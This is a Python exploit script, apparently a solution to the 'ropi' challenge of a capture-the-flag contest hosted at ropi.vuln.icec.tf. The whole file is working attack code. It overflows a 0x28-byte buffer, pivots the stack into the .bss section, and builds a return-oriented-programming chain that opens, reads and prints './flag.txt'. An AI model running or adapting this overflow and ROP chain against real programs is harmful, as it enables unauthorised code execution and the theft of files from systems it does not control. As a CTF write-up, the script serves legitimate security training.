#!/usr/bin/env python
from sc_pwn import *

#target     = {'host':'192.168.75.133','port':8080}
target     = {'host':'ropi.vuln.icec.tf','port':6500}

binf = ELF('ropi_1335922d55bc23ddc49a8c5077723113d5cddf02756ad8231e96058188bfc249', True)

addr_plt_read       = binf.plt('read')
addr_plt_puts       = binf.plt('puts')
addr_plt_exit       = binf.plt('exit')
addr_plt_open       = binf.plt('open')

addr_bss            = binf.section('.bss')
addr_nwstack        = addr_bss+0x800

addr_str_flagtxt    = binf.search('./flag.txt')

addr_pop2           = binf.ropgadget('pop','pop','ret')
addr_pop3           = binf.ropgadget('pop','pop','pop','ret')
addr_leave          = binf.ropgadget('leave','ret')

#==========
def attack(cmn):
    cmn.read_until('messaggio?\n')

    exploit  = 'a'*0x28
    exploit += pack_32(addr_nwstack)
    exploit += pack_32(addr_plt_read)
    exploit += pack_32(addr_leave)
    exploit += pack_32(STDIN_FILENO)
    exploit += pack_32(addr_nwstack)
    exploit += pack_32(0x100)
    cmn.send(exploit)

    payload  = pack_32(0xdeadbeef)
    payload += pack_32(addr_plt_open)
    payload += pack_32(addr_pop2)
    payload += pack_32(addr_str_flagtxt)
    payload += pack_32(O_RDONLY)
    payload += pack_32(addr_plt_read)
    payload += pack_32(addr_pop3)
    payload += pack_32(3)
    payload += pack_32(addr_bss)
    payload += pack_32(0x100)
    payload += pack_32(addr_plt_puts)
    payload += pack_32(addr_plt_exit)
    payload += pack_32(addr_bss)
    cmn.send(payload)

    info('flag : %s' % cmn.read_until())
    

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='SOCKET')
    attack(cmn)
    del(cmn)
    
#==========
